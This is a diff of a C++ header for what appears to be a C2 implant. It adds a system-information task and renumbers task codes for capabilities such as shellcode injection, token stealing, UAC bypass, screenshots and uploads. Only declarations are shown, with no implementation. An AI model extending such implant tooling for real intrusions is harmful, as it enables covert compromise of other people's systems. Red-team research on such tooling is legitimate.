@@ -19,7 +19,10 @@
 #include <strsafe.h>
 #include <synchapi.h>
 #include <chrono>
+#include <iostream>
+#include <iomanip>
 #include <map>
+#include <sstream>
 #include <string>
 #include <vector>
 
@@ -77,13 +80,14 @@
 #define TASK_SCREENSHOT         0x38
 #define TASK_SHELLCODE          0x39
 #define TASK_SLEEP              0x40
-#define TASK_TOKEN_REVERT       0x41
-#define TASK_TOKEN_STEAL        0x42
-#define TASK_UAC                0x43
-#define TASK_UPLOAD             0x44
-#define TASK_USER_LS            0x45
-#define TASK_WHOAMI             0x46
-#define TASK_WHOAMI_PRIV        0x47
+#define TASK_SYSINFO            0x41
+#define TASK_TOKEN_REVERT       0x42
+#define TASK_TOKEN_STEAL        0x43
+#define TASK_UAC                0x44
+#define TASK_UPLOAD             0x45
+#define TASK_USER_LS            0x46
+#define TASK_WHOAMI             0x47
+#define TASK_WHOAMI_PRIV        0x48
 
 namespace Task
 {
@@ -174,6 +178,7 @@ namespace Task
     std::wstring Screenshot(State::PSTATE pState);
     std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
+    std::wstring Sysinfo(State::PSTATE pState);
     std::wstring TokenRevert(State::PSTATE pState);
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
     std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique);
